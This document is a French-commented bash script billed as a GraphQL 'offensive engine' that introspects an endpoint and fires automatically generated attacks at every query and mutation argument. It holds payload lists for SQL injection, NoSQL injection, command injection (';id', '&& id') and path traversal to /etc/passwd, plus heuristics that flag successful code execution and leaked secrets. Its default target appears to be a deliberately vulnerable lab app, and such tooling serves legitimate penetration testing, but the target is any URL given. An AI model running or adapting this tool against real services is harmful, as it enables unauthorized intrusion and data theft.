#!/usr/bin/env bash
###########################################################################
#  DARKMOON A1 — ULTRA PRO GRAPHQL OFFENSIVE ENGINE (CLEAN VERSION)
#
#  - Introspection complète (__schema)
#  - Génération d'attaques ciblées par argument (SQLi / NoSQLi / RCE / Path / Fuzz)
#  - Sélection automatique des sous-champs pour les OBJECT
#  - Exécution séquentielle de toutes les opérations générées
#  - Détection RCE / SQLi / sensitive info / erreurs internes
#  - Export JSON → /output/graphql/report.json
#  - Proxy ZAP optionnel (ENABLE_ZAP=1, ZAP_URL, ZAP_KEY)
###########################################################################

set -euo pipefail

DM_VERSION="A1-ULTRA-PRO-CLEAN"

usage() {
  echo "Usage: $0 [GRAPHQL_URL]"
  echo
  echo "Exemples :"
  echo "  $0 http://dvga:5013/graphql"
  echo "  TARGET=http://autre:4000/graphql $0"
  exit 1
}

# Si un argument est fourni → priorité à cet URL
if [ "${1:-}" != "" ]; then
  TARGET="$1"
else
  # Sinon on retombe sur la variable d'env ou le défaut DVGA
  TARGET="${TARGET:-http://dvga:5013/graphql}"
fi

if [ -z "$TARGET" ]; then
  echo "[ERR] Aucun endpoint GraphQL fourni."
  usage
fi


ENABLE_ZAP="${ENABLE_ZAP:-1}"
ZAP_URL="${ZAP_URL:-http://zap:8888}"
ZAP_KEY="${ZAP_KEY:-$(cat /zap/wrk/ZAP-API-TOKEN 2>/dev/null || echo '')}"

OUT_DIR="/tmp/darkmoon_graph_attack"
mkdir -p "$OUT_DIR"

########################################
# UTIL / STYLE
########################################

have() { command -v "$1" >/dev/null 2>&1; }

if ! have jq;   then echo "[ERR] jq missing" >&2; exit 1; fi
if ! have curl; then echo "[ERR] curl missing" >&2; exit 1; fi

RED="\e[31m"; GREEN="\e[32m"; YELLOW="\e[33m"; BLUE="\e[34m"; MAGENTA="\e[35m"; CYAN="\e[36m"; RESET="\e[0m"

banner()  { echo -e "\n${MAGENTA}========================================================="; echo -e "$1"; echo -e "=========================================================${RESET}"; }
info()    { echo -e "${CYAN}[*]${RESET} $*"; }
ok()      { echo -e "${GREEN}[OK]${RESET} $*"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $*"; }
err()     { echo -e "${RED}[ERR]${RESET} $*" >&2; }

########################################
# ENVOI REQUÊTES GRAPHQL
########################################

gql_send() {
  local q="$1"
  local json out rc

  json=$(printf '%s' "$q" | jq -Rs '{query: .}')

  # On neutralise -e à l'intérieur pour éviter que curl ne kill le script
  set +e
  if [ "$ENABLE_ZAP" = "1" ] && curl -s --max-time 2 "$ZAP_URL" >/dev/null 2>&1; then
    out=$(HTTP_PROXY="$ZAP_URL" http_proxy="$ZAP_URL" \
      curl -s -X POST "$TARGET" -H "Content-Type: application/json" --data "$json")
    rc=$?
  else
    out=$(curl -s -X POST "$TARGET" -H "Content-Type: application/json" --data "$json")
    rc=$?
  fi
  set -e

  printf '%s\n' "$out"
  return "$rc"
}

########################################
# INTROSPECTION
########################################

banner "[*] INTROSPECTION ENGINE - FULL RECURSIVE MODE"

INTROSPECTION_QUERY='
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType { kind name ofType { kind name } }
          }
        }
        type {
          kind
          name
          ofType { kind name ofType { kind name } }
        }
      }
    }
    mutationType {
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType { kind name ofType { kind name } }
          }
        }
        type {
          kind
          name
          ofType { kind name ofType { kind name } }
        }
      }
    }
    types {
      name
      kind
      fields {
        name
        type {
          kind
          name
          ofType { kind name ofType { kind name } }
        }
      }
    }
  }
}
'

info "Sending introspection request…"
INTROSPECTION_RAW=$(gql_send "$INTROSPECTION_QUERY")
echo "$INTROSPECTION_RAW" > "$OUT_DIR/introspection_raw.json"

if echo "$INTROSPECTION_RAW" | jq -e '.errors' >/dev/null 2>&1; then
  err "Introspection failed / disabled"
  echo "$INTROSPECTION_RAW" | jq .
  exit 1
fi
ok "Introspection successful."
ok "Query, Mutation and Type maps extracted."

QUERIES=$(echo "$INTROSPECTION_RAW"   | jq -r '.data.__schema.queryType.fields[].name')
MUTATIONS=$(echo "$INTROSPECTION_RAW" | jq -r '.data.__schema.mutationType.fields[].name // empty')

banner "[*] INTROSPECTION SUMMARY"

echo "[OK] Queries detected:"
echo "$QUERIES" | sed 's/^/  - /'
echo
echo "[OK] Mutations detected:"
[ -n "$MUTATIONS" ] && echo "$MUTATIONS" | sed 's/^/  - /' || echo "  (none)"
echo
TYPES_COUNT=$(echo "$INTROSPECTION_RAW" | jq '.data.__schema.types | length')
echo "[OK] Total GraphQL types:"
echo "$TYPES_COUNT types"

########################################
# HELPERS TYPE / CHAMPS
########################################

unwrap_type_json() {
  jq -c '
    def baseType(t):
      if (t.kind=="NON_NULL" or t.kind=="LIST") and (t.ofType != null)
      then baseType(t.ofType)
      else t
      end;
    baseType(.)
  '
}

get_args() {
  local name="$1"
  local mode="$2" # query | mutation

  if [ "$mode" = "query" ]; then
    echo "$INTROSPECTION_RAW" | jq -c --arg n "$name" '
      .data.__schema.queryType.fields[]
      | select(.name==$n)
      | .args
    '
  else
    echo "$INTROSPECTION_RAW" | jq -c --arg n "$name" '
      .data.__schema.mutationType.fields[]
      | select(.name==$n)
      | .args
    '
  fi
}

resolve_return_type() {
  local name="$1"
  local mode="$2"

  if [ "$mode" = "query" ]; then
    echo "$INTROSPECTION_RAW" | jq -c --arg n "$name" '
      .data.__schema.queryType.fields[]
      | select(.name==$n)
      | .type
    ' | unwrap_type_json
  else
    echo "$INTROSPECTION_RAW" | jq -c --arg n "$name" '
      .data.__schema.mutationType.fields[]
      | select(.name==$n)
      | .type
    ' | unwrap_type_json
  fi
}

get_scalar_fields_for_type() {
  local typename="$1"
  echo "$INTROSPECTION_RAW" \
    | jq -r --arg t "$typename" '
      .data.__schema.types[]
      | select(.name==$t)
      | .fields // []
      | map(select(.type.kind=="SCALAR"))[].name
    ' 2>/dev/null || true
}

########################################
# PAYLOAD ENGINE — ciblé par argument
########################################

banner "[*] PAYLOAD ENGINE — TARGETED FUZZ PER ARGUMENT"

# payloads bruts (SANS guillemets autour → on les ajoute après)
SQLI_PAYLOADS=(
  "' OR 1=1--"
  "' OR 'a'='a"
  "1 OR 1=1"
  "' UNION SELECT 1,2,3--"
)

NOSQLI_PAYLOADS=(
  '{"\$ne": null}'
  '{"\$gt": ""}'
)

RCE_PAYLOADS=(
  ";id"
  "| id"
  "&& id"
)

TRAVERSAL_PAYLOADS=(
  "../../../../etc/passwd"
  "/etc/passwd"
)

FUZZ_STRING_PAYLOADS=(
  "AAAAAAAAAAAAAAAAAAAA"
  "'\"\\}{@£$%()*!^"
  "{}[]()"
  "{\"test\":1}"
)

select_payloads_for_arg() {
  local arg="$1"
  local type="$2"

  case "$type" in
    String)
      case "$arg" in
        password|pass|pwd|token|secret|auth|authorization|jwt)
          printf '%s\n' "${SQLI_PAYLOADS[@]}"
          ;;
        cmd|command|exec)
          printf '%s\n' "${RCE_PAYLOADS[@]}"
          ;;
        file|path|dir|location)
          printf '%s\n' "${TRAVERSAL_PAYLOADS[@]}"
          ;;
        filter|search|query|q)
          printf '%s\n' "${SQLI_PAYLOADS[@]}"
          printf '%s\n' "${NOSQLI_PAYLOADS[@]}"
          ;;
        *)
          printf '%s\n' "${SQLI_PAYLOADS[@]}"
          printf '%s\n' "${FUZZ_STRING_PAYLOADS[@]}"
          ;;
      esac
      ;;
    Int)
      printf '%s\n' "1" "0" "-1" "999999"
      ;;
    Boolean)
      printf '%s\n' "true" "false"
      ;;
    ID)
      printf '%s\n' "${SQLI_PAYLOADS[@]}"
      ;;
  esac
}

escape_graphql_string() {
  # échappe \ et "
  printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
}

build_selection_fragment() {
  local kind="$1"
  local name="$2"

  if [ "$kind" != "OBJECT" ]; then
    echo ""
    return
  fi

  local fields
  fields=$(get_scalar_fields_for_type "$name")

  if [ -z "$fields" ]; then
    echo ""
    return
  fi

  # limite à quelques champs pour ne pas exploser
  local first_fields
  first_fields=$(printf '%s\n' "$fields" | head -n 6 | tr '\n' ' ' | sed 's/  */ /g')

  printf ' { %s }' "$first_fields"
}

########################################
# COLLECTEUR D’OPÉRATIONS
########################################

declare -a ALL_OPS=()

build_attacks_for_operation() {
  local op_name="$1"
  local mode="$2"   # query | mutation

  local args_json ret_type base_kind base_name
  args_json=$(get_args "$op_name" "$mode")
  ret_type=$(resolve_return_type "$op_name" "$mode")

  base_kind=$(echo "$ret_type" | jq -r '.kind')
  base_name=$(echo "$ret_type" | jq -r '.name')

  local sel
  sel=$(build_selection_fragment "$base_kind" "$base_name")

  # Pas d'arguments → un seul appel
  if [ -z "$args_json" ] || [ "$args_json" = "null" ]; then
    ALL_OPS+=("{ $op_name$sel }")
    return
  fi

  mapfile -t ARGS < <(echo "$args_json" | jq -c '.[]')

  # On fuzz UN argument à la fois (évite explosion combinatoire)
  for a in "${ARGS[@]}"; do
    local arg_name base_tkind base_tname
    arg_name=$(echo "$a" | jq -r '.name')
    base_tkind=$(echo "$a" | jq -r '
      .type | def b(t):
        if t.kind=="NON_NULL" or t.kind=="LIST" then b(t.ofType)
        else t end;
      b(.) | .kind
    ')
    base_tname=$(echo "$a" | jq -r '
      .type | def b(t):
        if t.kind=="NON_NULL" or t.kind=="LIST" then b(t.ofType)
        else t end;
      b(.) | .name
    ')

    mapfile -t PAYS < <(select_payloads_for_arg "$arg_name" "$base_tname")

    # si aucun payload dédié → skip cet arg
    if [ "${#PAYS[@]}" -eq 0 ]; then
      continue
    fi

    for payload in "${PAYS[@]}"; do
      local val

      case "$base_tname" in
        String|ID)
          local esc
          esc=$(escape_graphql_string "$payload")
          val="\"$esc\""
          ;;
        Int)
          val="$payload"
          ;;
        Boolean)
          val="$payload"
          ;;
        *)
          # type exotique → on skip
          continue
          ;;
      esac

      local args_frag
      args_frag="$arg_name: $val"

      ALL_OPS+=("{ $op_name($args_frag)$sel }")
    done
  done
}

banner "[*] OPERATION COLLECTOR — GENERATING ATTACK SET"

info "Génération des opérations d’attaque…"

for q in $QUERIES; do
  build_attacks_for_operation "$q" "query"
done

for m in $MUTATIONS; do
  [ -n "$m" ] || continue
  build_attacks_for_operation "$m" "mutation"
done

TOTAL_OPS=${#ALL_OPS[@]}
ok "Total opérations générées : $TOTAL_OPS"

################################################################################
# BLOCK FINAL — EXECUTION + HEURISTIQUES + REPORT + ZAP
################################################################################

# Couleurs (safe même si déjà définies plus haut)
RED="\e[31m"; GREEN="\e[32m"; YELLOW="\e[33m"; BLUE="\e[34m"; MAGENTA="\e[35m"; CYAN="\e[36m"; RESET="\e[0m"

################################################################################
# BLOCK FINAL — EXECUTION + HEURISTIQUES + REPORT + ZAP
################################################################################

banner "[*] ATTACK EXECUTION ENGINE — PER-OPERATION ANALYSIS"

###############################################
# INIT VARIABLES (fixe l'erreur unbound variable)
###############################################
VULNS_RCE=()
VULNS_SQLI=()
VULNS_LEAK=()
VULNS_ERRORS=()
VULNS_MISC=()
ATTACK_COUNT=0

# Stockage des vulnérabilités (tableaux)
declare -a VULNS_RCE
declare -a VULNS_SQLI
declare -a VULNS_LEAK
declare -a VULNS_ERRORS
declare -a VULNS_MISC

ATTACK_COUNT=0

###############################################
# HEURISTIQUES DÉTECTION
###############################################

detect_all() {
    local op="$1"
    local resp="$2"
    local hit=0   # flag : 1 si on a trouvé quelque chose

    # RCE
    if grep -qiE 'uid=[0-9]+|gid=[0-9]+|root:x:0:0' <<< "$resp"; then
        VULNS_RCE+=("$op")
        echo -e "${RED}[RCE] Exploitation détectée !${RESET}"
        hit=1
    fi

    # SQL Injection
    if grep -qiE 'SQLSTATE|sqlite|postgres|mysql|syntax error' <<< "$resp"; then
        VULNS_SQLI+=("$op")
        echo -e "${RED}[SQLi] Erreur SQL détectée !${RESET}"
        hit=1
    fi

    # Fuite d’infos sensibles
    if grep -qiE 'password|token|secret|api_key|accessToken|jwt' <<< "$resp"; then
        VULNS_LEAK+=("$op")
        echo -e "${YELLOW}[LEAK] Informations sensibles dans la réponse${RESET}"
        hit=1
    fi

    # Erreurs internes serveur
    if grep -qiE 'Exception|Traceback|panic|NullReference|stacktrace' <<< "$resp"; then
        VULNS_ERRORS+=("$op")
        echo -e "${RED}[INTERNAL ERROR] Exception serveur détectée${RESET}"
        hit=1
    fi

    # Anomalies génériques
    if grep -qiE 'root:|invalid json|bad request|forbidden|unauthorized' <<< "$resp"; then
        VULNS_MISC+=("$op")
        echo -e "${CYAN}[ANOMALY] Réponse suspecte${RESET}"
        hit=1
    fi

    # Si au moins une heuristique a matché, on affiche l’OP + la réponse complète
    if [ "$hit" -eq 1 ]; then
        echo -e "${GREEN}[VULN OP]${RESET} $op"
        echo "$resp" | jq . 2>/dev/null || echo "$resp"
        echo
    fi
}

###############################################
# EXECUTION D’UNE OPÉRATION
###############################################

execute_operation() {
    local op="$1"

    # compteur global
    : "${ATTACK_COUNT:=0}"
    ATTACK_COUNT=$((ATTACK_COUNT + 1))

    # On n'affiche pas l'OP ici, seulement si vuln détectée
    local resp rc
    resp=$(gql_send "$op")
    rc=$?

    if [ "$rc" -ne 0 ]; then
        # Erreur réseau / curl → on trace éventuellement en discret
        # echo -e "${RED}[ERR] gql_send a échoué (exit $rc)${RESET}" >&2
        return
    fi

    # On laisse detect_all décider si ça mérite d’être affiché ou pas
    detect_all "$op" "$resp"
}


###############################################
# FONCTIONS ZAP (si tu ne les as pas déjà plus haut)
###############################################

zap_show_alerts() {
    if [ "$ENABLE_ZAP" != "1" ] || [ -z "${ZAP_KEY:-}" ]; then
        echo "[ZAP] Pas d'alertes (ZAP désactivé ou clé absente)."
        return
    fi

    echo
    echo "========================================================="
    echo "[ZAP] Récupération des alertes pour $TARGET"
    echo "========================================================="

    local alerts
    alerts=$(curl -s "$ZAP_URL/JSON/core/view/alerts/?apikey=$ZAP_KEY" || echo '{}')

    echo "$alerts" \
      | jq -c '.alerts[]? | {risk, alert, url, param, evidence}' \
      | jq -r '."\(.risk)" + " | " + .alert + " | " + .url + " | " + (.param//"")'
}

###############################################
# RAPPORT FINAL
###############################################

generate_report() {
    echo -e "\n${MAGENTA}=========================================="
    echo -e "         🔥 RÉSULTATS DE L'AUTO-ATTACK"
    echo -e "==========================================${RESET}"

    echo -e "${CYAN}Total opérations envoyées :${RESET} $ATTACK_COUNT"

    echo -e "\n${RED}RCE détectées : ${#VULNS_RCE[@]}${RESET}"
    for v in "${VULNS_RCE[@]}"; do echo "  - $v"; done

    echo -e "\n${RED}SQL Injection détectées : ${#VULNS_SQLI[@]}${RESET}"
    for v in "${VULNS_SQLI[@]}"; do echo "  - $v"; done

    echo -e "\n${YELLOW}Leaks / données sensibles : ${#VULNS_LEAK[@]}${RESET}"
    for v in "${VULNS_LEAK[@]}"; do echo "  - $v"; done

    echo -e "\n${RED}Erreurs internes : ${#VULNS_ERRORS[@]}${RESET}"
    for v in "${VULNS_ERRORS[@]}"; do echo "  - $v"; done

    echo -e "\n${CYAN}Anomalies diverses : ${#VULNS_MISC[@]}${RESET}"
    for v in "${VULNS_MISC[@]}"; do echo "  - $v"; done

    echo -e "\n${MAGENTA}==========================================${RESET}"
    echo -e "${MAGENTA}           EXPORT JSON EN COURS...${RESET}"

    mkdir -p /output/graphql

    jq -n \
        --arg target "$TARGET" \
        --argjson rce    "$(printf '%s\n' "${VULNS_RCE[@]:-}"    | jq -R . | jq -s .)" \
        --argjson sqli   "$(printf '%s\n' "${VULNS_SQLI[@]:-}"   | jq -R . | jq -s .)" \
        --argjson leak   "$(printf '%s\n' "${VULNS_LEAK[@]:-}"   | jq -R . | jq -s .)" \
        --argjson errors "$(printf '%s\n' "${VULNS_ERRORS[@]:-}" | jq -R . | jq -s .)" \
        --argjson misc   "$(printf '%s\n' "${VULNS_MISC[@]:-}"   | jq -R . | jq -s .)" \
        --arg attacks "$ATTACK_COUNT" \
        '
        {
            target: $target,
            stats: { attacks: $attacks },
            vulnerabilities: {
                RCE: $rce,
                SQLI: $sqli,
                LEAK: $leak,
                INTERNAL: $errors,
                MISC: $misc
            }
        }
        ' > /output/graphql/report.json

    echo -e "${GREEN}[OK] Rapport exporté → /output/graphql/report.json${RESET}"

    zap_show_alerts
}

###############################################
# BOUCLE PRINCIPALE D’EXECUTION
###############################################

banner "[*] EXECUTING GENERATED OPERATIONS"

echo -e "${CYAN}[DEBUG] Nombre d'opérations dans ALL_OPS : ${#ALL_OPS[@]}${RESET}"

# Petit aperçu des 5 premières pour debug
for i in $(seq 0 4); do
    [ "$i" -lt "${#ALL_OPS[@]}" ] || break
    echo -e "${CYAN}[DEBUG] OP[$i] = ${ALL_OPS[$i]}${RESET}"
done

echo -e "${YELLOW}[DEBUG] >>> DÉBUT RÉEL DE LA BOUCLE D'EXÉCUTION <<<${RESET}"

for op in "${ALL_OPS[@]}"; do
    echo -e "${CYAN}[DEBUG] ENTER LOOP WITH OP:${RESET} $op"
    execute_operation "$op"
done

echo -e "${YELLOW}[DEBUG] >>> FIN RÉELLE DE LA BOUCLE D'EXÉCUTION <<<${RESET}"

generate_report